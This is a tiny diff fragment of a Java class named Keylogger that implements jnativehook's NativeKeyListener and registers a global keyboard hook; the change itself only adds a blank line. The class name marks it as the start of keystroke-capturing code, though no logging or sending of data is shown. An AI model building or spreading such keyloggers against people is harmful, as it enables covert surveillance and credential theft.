@@ -6,6 +6,7 @@ import org.jnativehook.keyboard.NativeKeyListener;
 
 public class Keylogger implements NativeKeyListener{
 	
+	
 	public void initialiseListener() {
 		try {
 			GlobalScreen.registerNativeHook();
